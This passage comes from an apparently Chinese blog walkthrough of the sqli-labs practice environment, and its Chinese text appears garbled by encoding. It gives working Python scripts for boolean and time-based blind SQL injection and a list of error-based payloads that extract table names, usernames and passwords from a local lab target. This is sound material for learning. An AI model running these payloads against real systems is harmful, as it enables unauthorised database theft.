class="line">    length_name = get_database_length2(length)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è·å–è¡¨é•¿åº¦&quot;</span>)</span><br><span class="line">    table_length = get_table_length()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è·å–è¡¨å&quot;</span>)</span><br><span class="line">    table_name = get_table_name(table_length)</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;è·å–è¡¨åä¸ºemails,referers,uagents,usersï¼Œ<font color=blue>ç»†èŠ‚3:å› ä¸ºè¡¨åä¸æ­¢ä¸€ä¸ªï¼Œä¸­é—´çš„åˆ†éš”ç¬¦,æˆ‘ä»¬å¯ä»¥æŠŠASCIIçš„èŒƒå›´è°ƒåˆ°33-127</font>å¦‚æœè§‰å¾—è¿è¡Œè¾ƒæ…¢çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨ç®—æ³•åŠ å·¥ï¼Œä¾‹å¦‚äºŒåˆ†æ³•,æˆ–è€…æŠŠè·å–åˆ°çš„ä¿¡æ¯æ³¨é‡Šæ‰ã€‚ä¸‹ä¸€æ­¥ï¼Œçˆ†åˆ—ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_column_length</span>():</span><br><span class="line">    <span class="keyword">global</span> flag,url</span><br><span class="line">    length = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">        payload = <span class="string">f&quot;?id=1&#x27;and length((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;))=<span class="subst">&#123;length&#125;</span>--+&quot;</span></span><br><span class="line">        response = requests.get(url + payload).text</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">not</span> <span class="keyword">in</span> response:</span><br><span class="line">            length += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è¡¨é•¿åº¦ä¸º&quot;</span>, length)</span><br><span class="line">    <span class="keyword">return</span> length</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_column_name</span>(<span class="params">column_length</span>):</span><br><span class="line">    <span class="keyword">global</span> flag,url</span><br><span class="line">    column_name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, column_length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">122</span>):</span><br><span class="line">            payload = <span class="string">f&quot;?id=1&#x27;and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>--+&quot;</span></span><br><span class="line">            response = requests.get(url + payload).text</span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">in</span> response:</span><br><span class="line">                column_name += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;è¡¨åä¸º&quot;</span>,column_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> column_name</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è·å–æ•°æ®åº“é•¿åº¦&quot;</span>)</span><br><span class="line">    length = get_database_length()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è·å–æ•°æ®åº“å&quot;</span>)</span><br><span class="line">    length_name = get_database_length2(length)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è·å–è¡¨é•¿åº¦&quot;</span>)</span><br><span class="line">    table_length = get_table_length()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è·å–è¡¨å&quot;</span>)</span><br><span class="line">    table_name = get_table_name(table_length)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è·å–åˆ—é•¿åº¦&quot;</span>)</span><br><span class="line">    column_length = get_column_length()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è·å–åˆ—å&quot;</span>)</span><br><span class="line">    column_name = get_column_name(column_length)</span><br></pre></td></tr></table></figure>
<p><img data-src="/images/sql/sql5-column.png" alt="sql5-column"><br>&emsp;&emsp;æœ€åçˆ†å­—æ®µ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_column_id</span>():</span><br><span class="line">    <span class="keyword">global</span> flag,url</span><br><span class="line">    length = <span class="number">1</span></span><br><span class="line">    <span class="built_in">id</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">        payload = <span class="string">f&quot;?id=1&#x27;and length((select group_concat(id) from users))=<span class="subst">&#123;length&#125;</span>--+&quot;</span></span><br><span class="line">        response = requests.get(url + payload).text</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">not</span> <span class="keyword">in</span> response:</span><br><span class="line">            length += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;idé•¿åº¦ä¸º&quot;</span>,length)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,length+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">122</span>):</span><br><span class="line">            payload = <span class="string">f&quot;?id=1&#x27;and ascii(substr((select group_concat(id) from users),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>--+&quot;</span></span><br><span class="line">            response = requests.get(url + payload).text</span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">in</span> response:</span><br><span class="line">                <span class="built_in">id</span> += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;idä¸º&quot;</span>,<span class="built_in">id</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">id</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># print(&quot;è·å–æ•°æ®åº“é•¿åº¦&quot;)</span></span><br><span class="line">    <span class="comment"># length = get_database_length()</span></span><br><span class="line">    <span class="comment"># print(&quot;è·å–æ•°æ®åº“å&quot;)</span></span><br><span class="line">    <span class="comment"># length_name = get_database_length2(length)</span></span><br><span class="line">    <span class="comment"># print(&quot;è·å–è¡¨é•¿åº¦&quot;)</span></span><br><span class="line">    <span class="comment"># table_length = get_table_length()</span></span><br><span class="line">    <span class="comment"># print(&quot;è·å–è¡¨å&quot;)</span></span><br><span class="line">    <span class="comment"># table_name = get_table_name(table_length)</span></span><br><span class="line">    <span class="comment"># print(&quot;è·å–åˆ—é•¿åº¦&quot;)</span></span><br><span class="line">    <span class="comment"># column_length = get_column_length()</span></span><br><span class="line">    <span class="comment"># print(&quot;è·å–åˆ—å&quot;)</span></span><br><span class="line">    <span class="comment"># column_name = get_column_name(column_length)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è·å–å­—æ®µ&quot;</span>)</span><br><span class="line">    <span class="built_in">id</span> = get_column_id()</span><br></pre></td></tr></table></figure>
<p><img data-src="/images/sql/sql5-id.png" alt="sql5-id"></p>
<h3 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h3><p>&emsp;&emsp;å½“åšåˆ°ç¬¬ä¹å…³çš„æ—¶å€™ï¼Œæµ‹è¯•é—­åˆç¬¦ä¸ç®¡è¾“å…¥ä»€ä¹ˆé¡µé¢æ˜¾ç¤ºçš„ä¸œè¥¿éƒ½æ˜¯ä¸€æ ·çš„ï¼Œè¿™ä¸ªæ—¶å€™å°±å¾—è€ƒè™‘æ—¶é—´ç›²æ³¨äº†ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨sleep()æ¥ä½¿é¡µé¢å»¶è¿Ÿï¼Œä»è€Œè‚‰çœ¼åˆ†è¾¨çœŸå‡ï¼Œæ—¶é—´ç›²æ³¨å’Œå¸ƒå°”ç›²æ³¨ä¸¤ç§æ²¡æœ‰å¤šå¤§çš„åŒºåˆ«ï¼Œåªä¸è¿‡æ—¶é—´ç›²æ³¨å¤šäº†<font color=red>ifå’Œsleepå‡½æ•°</font>,if(a,sleep(3),1)å¦‚æœaç»“æœä¸ºtrueï¼Œé‚£ä¹ˆæ‰§è¡Œsleep(3)é¡µé¢å»¶è¿Ÿ10ç§’ï¼Œåä¹‹æ‰§è¡Œ1ï¼Œæ— å»¶è¿Ÿã€‚<br>&emsp;&emsp;æµ‹è¯•æ˜¯å¦å¯ä»¥æ‰§è¡Œæ—¶é—´ç›²æ³¨çš„æ–¹æ³•ï¼Œåˆ¤æ–­é—­åˆç¬¦çš„æ–¹æ³•ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œä¿®æ”¹1&#x3D;1ï¼Œå¦‚æœå‡å’ŒçœŸéƒ½æ— å»¶è¿Ÿå°±è¯´æ˜æ˜¯é—­åˆç¬¦çš„é—®é¢˜ï¼Œä¸€èˆ¬åªè¦çœŸæœ‰å»¶è¿Ÿå°±è¯´æ˜é—­åˆç¬¦æ­£ç¡®ï¼Œ</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1&#x27; <span class="keyword">and</span> <span class="keyword">if</span>(<span class="attribute">1</span>=1,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;è¡Œï¼Œæ—¢ç„¶çŸ¥é“äº†ï¼Œé‚£ä¹ˆå¤§è‡´çš„payloadåº”è¯¥ä¹Ÿå°±å‡ºæ¥äº†ã€‚æ—¢ç„¶æœ‰å»¶è¿Ÿï¼Œå°±è¯´æ˜æµè§ˆå™¨çš„timeoutå°±ä¼šæœ‰å¢åŠ ï¼Œæˆ‘ä»¬å°±åªéœ€è¦è°ƒæ•´ä¸€ä¸‹å¸ƒå°”å‡½æ•°çš„pyå°±å¯ä»¥äº†ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://sql-labs:3601/Less-9/&#x27;</span>  <span class="comment"># ç›®æ ‡URL</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_database_length</span>():</span><br><span class="line">    <span class="keyword">global</span> url  <span class="comment"># å…¨å±€å˜é‡</span></span><br><span class="line">    length = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">        payload = <span class="string">f&quot;?id=1&#x27; and if(length((select database()))=<span class="subst">&#123;length&#125;</span>,sleep(3),1)--+&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:  <span class="comment">#try-except å—æ•è·ä»»ä½•å¯èƒ½çš„å¼‚å¸¸ï¼Œå¦‚ç½‘ç»œè¶…æ—¶æˆ–è¿æ¥é”™è¯¯ã€‚</span></span><br><span class="line">            response = requests.get(url + payload,timeout=<span class="number">3</span>).text <span class="comment">#è®¾ç½®è¶…æ—¶</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;success&quot;</span>)  <span class="comment">#å¦‚æœè¶…æ—¶äº†è¯´æ˜æ­£ç¡®ï¼Œè¿”å›success</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            length += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æ•°æ®åº“é•¿åº¦ä¸º&quot;</span>, length)</span><br><span class="line">    <span class="keyword">return</span> length</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;é€šè¿‡try-exceptè·å–è¶…æ—¶çš„ä¿¡æ¯ï¼Œä»è€Œåˆ¤æ–­å‡ºæ•°æ®åº“çš„é•¿åº¦ã€‚<br><img data-src="/images/sql/sql9-time1.png" alt="sql9-time1"><br>&emsp;&emsp;é‚£ä¹ˆåŒç†åŠ ifå’Œtry-exceptä»¥åŠtimeoutä»å¸ƒå°”ç›²æ³¨çš„è„šæœ¬è¿›è¡Œä¿®æ”¹å°±å¯ä»¥å–å‡ºæ•°æ®åº“åã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_database_length2</span>(<span class="params">database_length</span>):</span><br><span class="line">    <span class="keyword">global</span> url</span><br><span class="line">    database = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, database_length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>,<span class="number">122</span>):</span><br><span class="line">            payload = <span class="string">f&quot;?id=1&#x27; and if(ascii(substr((select database()),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>,sleep(3),1)--+&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                response = requests.get(url + payload,timeout=<span class="number">3</span>).text</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                database += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;æ•°æ®åº“åä¸º&quot;</span>,database)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> database</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;å…¶ä½™çš„è·Ÿè¿™ä¸¤ç§çš„ä¿®æ”¹æ–¹æ¡ˆä¸€æ ·ï¼Œæˆ‘å°±ä¸ä¸€ä¸€æ”¾å‡ºæ¥äº†ï¼Œæœ€ç»ˆå¯ä»¥å¾—åˆ°å­—æ®µ<br><img data-src="/images/sql/sql9-time2.png" alt="sql9-time2"></p>
<h2 id="postè¯·æ±‚"><a href="#postè¯·æ±‚" class="headerlink" title="postè¯·æ±‚"></a>postè¯·æ±‚</h2><h3 id="è”åˆæ³¨å…¥-1"><a href="#è”åˆæ³¨å…¥-1" class="headerlink" title="è”åˆæ³¨å…¥"></a>è”åˆæ³¨å…¥</h3><p>&emsp;&emsp;åšåˆ°ç¬¬åä¸€å…³ï¼Œè¯·æ±‚æ–¹å¼å˜ä¸ºäº†postè¯·æ±‚ï¼Œå˜æˆäº†æ›´ä¸ºå¸¸è§çš„ç±»å‹ï¼Œè¦æ±‚è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œé‚£ä¹ˆå¤§æ¦‚çš„sqlè¯­å¥å°±æ˜¯username&#x3D;[] and password&#x3D;[],æˆ‘ä»¬ä¹Ÿå¯ä»¥æµ‹è¯•é—­åˆç¬¦çœ‹æŠ¥é”™ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰ã€‚<br><img data-src="/images/sql/sql11-post.png" alt="sql11-post"><br>&emsp;&emsp;å¦‚æœæˆ‘ä»¬è¾“å…¥é—­åˆç¬¦æœ‰æŠ¥é”™çš„ï¼Œå°±è¯´æ˜æœ‰å›æ˜¾ï¼Œå°±å¯ä»¥åˆ©ç”¨è”åˆæ³¨å…¥ã€‚<br><img data-src="/images/sql/sql11-1.png" alt="sql11-1"><br>&emsp;&emsp;æŠ¥é”™çš„è¿™æ®µæˆ‘ä»¬åˆ†æä¸€ä¸‹å°±çŸ¥é“ä¸ºå•å¼•å·é—­åˆï¼Œæˆ‘ä»¬è¾“å…¥1â€™æ˜¯åé¢é—­åˆå˜æˆäº†åŒå¼•å·ï¼Œé‚£ä¹ˆå°±æ”¹å˜äº†åŸè¯­å¥è€ŒæŠ¥é”™ã€‚æ²¡åˆ†ææ˜ç™½çš„å†å»çœ‹çœ‹åŸºç¡€ã€‚<br>&emsp;&emsp;çŸ¥é“äº†sqlè¯­å¥æˆ‘ä»¬å°±å¯ä»¥æ„é€ ä¸€ä¸ªæ’æˆç«‹çš„sqlè¯­å¥ï¼Œä¹Ÿæˆä¸ºä¸‡èƒ½å¯†ç ï¼Œå…·ä½“å¯è½¬è‡³<a href="https://blog.csdn.net/hxhxhxhxx/article/details/108020010">ä¸‡èƒ½å¯†ç </a><br>&emsp;&emsp;æˆ‘ç”¨çš„æ˜¯<font color=red>1â€™ or 1&#x3D;1# </font>è¿™ä¸ªå¾—æ ¹æ®è¯­å¥è¿›è¡Œåˆ¤æ–­ï¼Œå®åœ¨ä¸çŸ¥é“å°±ç”¨BPçˆ†ç ´ï¼Œè¿™é‡Œpostè¯·æ±‚ç”¨çš„æ³¨é‡Šç¬¦é€šå¸¸ç”¨#ï¼Œå…·ä½“åŸå› æˆ‘ä¹Ÿä¸çŸ¥é“ï¼Œè°æ‡‚äº†å¯ä»¥ä¸¾ä¸ªçˆªã€‚<br><img data-src="/images/sql/sql11-2.png" alt="sql11-2"><br>&emsp;&emsp;æ¡ä»¶è¾¾æˆï¼Œè”åˆæ³¨å…¥å³å¯ã€‚</p>
<h3 id="å¸ƒå°”ç›²æ³¨-1"><a href="#å¸ƒå°”ç›²æ³¨-1" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h3><p>&emsp;&emsp;æ³¨å…¥æˆåŠŸæœ‰é¡µé¢å˜åŒ–æ— å›æ˜¾ï¼Œå¯ä»¥ä½¿ç”¨å¸ƒå°”ç›²æ³¨ï¼Œåªä¸è¿‡è¿™æ˜¯postè¯·æ±‚çš„ï¼Œå¯¹åº”çš„è„šæœ¬ä¹Ÿéœ€è¦ä¿®æ”¹ã€‚<font color>ç»†èŠ‚:å›æ˜¾æˆåŠŸçš„å‚æ•°æ˜¯ä¸ªå›¾ç‰‡ï¼Œctrl+Uèƒ½æ”¶é›†åˆ°ä¿¡æ¯å‚æ•°</font><br><img data-src="/images/sql/sql13-post.png" alt="sql13-post"></p>
<figure class="highlight hsp"><table><tr><td class="code"><pre><span class="line">url = <span class="string">&#x27;http://sql-labs:3601/Less-13/&#x27;</span>  <span class="meta"># ç›®æ ‡URL</span></span><br><span class="line">flag = <span class="string">&quot;../images/flag.jpg&quot;</span>  <span class="meta"># è®¾ç½®ä¸€ä¸ªå›æ˜¾æˆåŠŸçš„å­—æ ·</span></span><br><span class="line">data= &#123;</span><br><span class="line">    <span class="string">&quot;uname&quot;</span> : <span class="string">&quot;a&#x27;) or 1 #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;passwd&quot;</span> : <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;submit&quot;</span> : <span class="string">&quot;Submit&quot;</span></span><br><span class="line">&#125; <span class="meta">#postå‚æ•°</span></span><br><span class="line"></span><br><span class="line">def get_database_length():</span><br><span class="line">    global url, flag  <span class="meta"># å…¨å±€å˜é‡</span></span><br><span class="line">    <span class="keyword">length</span> = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">        payload = f<span class="string">&quot;1&#x27;) or length((select database()))=&#123;length&#125;#&quot;</span></span><br><span class="line">        data[<span class="string">&quot;uname&quot;</span>] = payload</span><br><span class="line">        response = requests.post(url, data=data).text</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">not</span> in response:</span><br><span class="line">            <span class="keyword">length</span> += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;æ•°æ®åº“é•¿åº¦ä¸º&quot;</span>, <span class="keyword">length</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">length</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;ç…§ç€ä¿®æ”¹ä¸€ä¸‹å³å¯ã€‚å‰©ä¸‹çš„ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œæµ‹é•¿å’Œå­—ç¬¦çš„å½¢å¼æ˜¯ä¸€æ ·ï¼Œæˆ‘å°±ä¾‹ä¸¾ä¸¤ä¸ªå°±è¡Œã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_database_length2</span>(<span class="params">database_length</span>):</span><br><span class="line">    <span class="keyword">global</span> flag, url</span><br><span class="line">    database = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, database_length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>,<span class="number">122</span>):</span><br><span class="line">            payload = <span class="string">f&quot;1&#x27;) or ascii(substr((select database()),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>#&quot;</span></span><br><span class="line">            data[<span class="string">&quot;uname&quot;</span>] = payload</span><br><span class="line">            response = requests.post(url,data=data).text</span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">in</span> response:</span><br><span class="line">                database += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;æ•°æ®åº“åä¸º&quot;</span>,database)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> database</span><br></pre></td></tr></table></figure>

<h3 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h3><p>&emsp;&emsp;ç¬¬åä¸ƒå…³æ˜¯ä¸€ä¸ªå¯†ç é‡ç½®ç•Œé¢ï¼Œç”¨æˆ·åå·²ç»æ‰¾åˆ°ï¼Œå¯†ç ä¸çŸ¥é“ï¼Œè¿™ä¸€é¢˜è¿˜å¯¹ç”¨æˆ·åè¿›è¡Œäº†æ£€æŸ¥ï¼Œå°±åªèƒ½å¯¹å¯†ç å…¥æ‰‹ï¼Œå¦‚æœå¸ƒå°”ç›²æ³¨å’Œæ—¶é—´ç›²æ³¨éƒ½ä¸èƒ½ä½¿ç”¨ï¼Œå°±å¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥ã€‚å°±ç›´æ¥ç»™å›ºå®šå…¬å¼äº†ï¼ŒåŸç†å¯ä»¥å†å»æœç´¢ä¸€ä¸‹ã€‚</p>
<h4 id="extractvalueæŠ¥é”™æ³¨å…¥"><a href="#extractvalueæŠ¥é”™æ³¨å…¥" class="headerlink" title="extractvalueæŠ¥é”™æ³¨å…¥"></a>extractvalueæŠ¥é”™æ³¨å…¥</h4><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">1&#x27;</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,concat(<span class="number">0x5c</span>,version(),<span class="number">0x5c</span>)))<span class="meta">#    çˆ†ç‰ˆæœ¬</span></span><br><span class="line"><span class="number">1&#x27;</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,concat(<span class="number">0x5c</span>,database(),<span class="number">0x5c</span>)))<span class="meta">#   çˆ†æ•°æ®åº“</span></span><br><span class="line"> </span><br><span class="line"><span class="number">1&#x27;</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,concat(<span class="number">0x5c</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">table_name</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema</span>=database()),<span class="number">0x5c</span>)))<span class="meta">#   çˆ†è¡¨å</span></span><br><span class="line"><span class="number">1&#x27;</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,concat(<span class="number">0x5c</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">column_name</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema</span>=database() <span class="keyword">and</span> table_name=<span class="string">&#x27;users&#x27;</span>),<span class="number">0x5c</span>)))<span class="meta"># </span></span><br><span class="line"> çˆ†å­—æ®µå</span><br><span class="line"> </span><br><span class="line"><span class="number">1&#x27;</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,concat(<span class="number">0x5c</span>,(<span class="function"><span class="keyword">select</span> password <span class="title">from</span> (<span class="params"><span class="keyword">select</span> password <span class="keyword">from</span> users <span class="keyword">where</span> username=<span class="string">&#x27;admin1&#x27;</span></span>) b) ,0x5c)))#      çˆ†å­—æ®µå†…å®¹è¯¥æ ¼å¼é’ˆå¯¹mysqlæ•°æ®åº“ã€‚</span></span><br><span class="line"><span class="function">1&#x27; <span class="title">and</span> (<span class="params">extractvalue(<span class="number">1</span>,concat(<span class="number">0x5c</span>,(<span class="keyword">select</span> group_concat(username,password</span>) <span class="keyword">from</span> users),0x5c)))#                      çˆ†å­—æ®µå†…å®¹ã€‚</span></span><br></pre></td></tr></table></figure>

<h4 id="updatexmlæŠ¥é”™æ³¨å…¥"><a href="#updatexmlæŠ¥é”™æ³¨å…¥" class="headerlink" title="updatexmlæŠ¥é”™æ³¨å…¥"></a>updatexmlæŠ¥é”™æ³¨å…¥</h4><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">123&#x27;</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x5c</span>,version(),<span class="number">0x5c</span>),<span class="number">1</span>))<span class="meta">#     çˆ†ç‰ˆæœ¬</span></span><br><span class="line"><span class="number">123&#x27;</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x5c</span>,database(),<span class="number">0x5c</span>),<span class="number">1</span>))<span class="meta">#    çˆ†æ•°æ®åº“</span></span><br><span class="line"> </span><br><span class="line">  </span><br><span class="line"><span class="number">123&#x27;</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x5c</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">table_name</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema</span>=database()),<span class="number">0x5c</span>),<span class="number">1</span>))<span class="meta">#      çˆ†è¡¨å</span></span><br><span class="line"><span class="number">123&#x27;</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x5c</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">column_name</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema</span>=<span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name =<span class="string">&#x27;users&#x27;</span>),<span class="number">0x5c</span>),<span class="number">1</span>))<span class="meta">#</span></span><br><span class="line">   çˆ†å­—æ®µå</span><br><span class="line"> </span><br><span class="line"><span class="number">123&#x27;</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x5c</span>,(<span class="function"><span class="keyword">select</span> password <span class="title">from</span> (<span class="params"><span class="keyword">select</span> password <span class="keyword">from</span> users <span class="keyword">where</span> username=<span class="string">&#x27;admin1&#x27;</span></span>) b),0x5c),1))#</span></span><br><span class="line"><span class="function">çˆ†å¯†ç è¯¥æ ¼å¼é’ˆå¯¹mysqlæ•°æ®åº“ã€‚</span></span><br><span class="line"><span class="function">çˆ†å…¶ä»–è¡¨å°±å¯ä»¥ï¼Œä¸‹é¢æ˜¯çˆ†emailsè¡¨</span></span><br><span class="line"><span class="function">123&#x27; <span class="title">and</span> (<span class="params">updatexml(<span class="number">1</span>,concat(<span class="number">0x5c</span>,(<span class="keyword">select</span> group_concat(column_name</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema</span>=<span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name =<span class="string">&#x27;emails&#x27;</span>),<span class="number">0x5c</span>),<span class="number">1</span>))<span class="meta">#</span></span><br><span class="line"> </span><br><span class="line"><span class="number">1&#x27;</span> <span class="keyword">and</span> (updatexml (<span class="number">1</span>,concat(<span class="number">0x5c</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">id,email_id</span>) <span class="keyword">from</span> emails),0x5c),1))#   çˆ†å­—æ®µå†…å®¹ã€‚</span></span><br></pre></td></tr></table></figure>

<h4 id="group-byæŠ¥é”™æ³¨å…¥"><a href="#group-byæŠ¥é”™æ³¨å…¥" class="headerlink" title="group byæŠ¥é”™æ³¨å…¥"></a>group byæŠ¥é”™æ³¨å…¥</h4><figure class="highlight q"><table><tr><td class="code"><pre><span class="line"><span class="number">123</span>&#x27; <span class="built_in">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(*) <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">group</span> <span class="keyword">by</span> concat(database(),<span class="number">0x5c</span>,<span class="built_in">floor</span>(<span class="built_in">rand</span>(<span class="number">0</span>)*<span class="number">2</span>)))#     çˆ†æ•°æ®åº“</span><br><span class="line"><span class="number">123</span>&#x27; <span class="built_in">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(*) <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">group</span> <span class="keyword">by</span> concat(version(),<span 